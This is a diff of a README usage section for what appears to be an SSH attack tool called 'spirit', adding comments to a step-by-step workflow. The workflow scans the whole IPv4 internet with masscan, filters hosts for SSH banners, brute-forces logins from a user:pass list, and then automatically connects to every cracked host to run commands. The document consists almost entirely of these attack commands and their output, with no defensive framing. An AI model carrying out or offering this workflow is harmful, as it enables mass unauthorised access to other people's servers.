@@ -13,20 +13,23 @@ $ masscan \
     --exclude 255.255.255.255 \
     -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
+# You now have a masscan oG (output Greppable) formatted file.
 
-# Parse the masscan output so that it's usable w/ spirit.
+# Parse open.lst so that it's usable w/ spirit.
 $ ./spirit parse open.lst
 INFO created h.lst in HOST:PORT format
+# spirit automatically created a HOST:PORT formatted h.lst file, you can provide your custom file name using the `--file` flag.
 
 # Now test these open ports if they're running SSH by grabbing banners.
 $ ./spirit banner
 SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
+# spirit automatically created a `b.lst` file containing the hosts running SSH and their banner.
 
-# Move the banner output for spirit to load (default h.lst).
+# Move the banner output (b.lst) to h.lst so spirit will load it automatically.
 $ mv b.lst h.lst
 
-# Add a password list for spirit to load (default p.lst).
+# Add a password list, spirit will automatically load user:pass from a p.lst file.
 $ cat > p.lst << EOF
 user1:pass1
 user1:pass2
@@ -41,6 +44,7 @@ INFO loaded p.lst with 4881 logins
 $ less -S found.lst
 
 # Connect to all your vulnerable hosts automatically & run commands.
+# omni will automatically attempt to connect to hosts found in the found.lst file.
 $ ./spirit omni -c 'whoami && uptime'
 ```
 
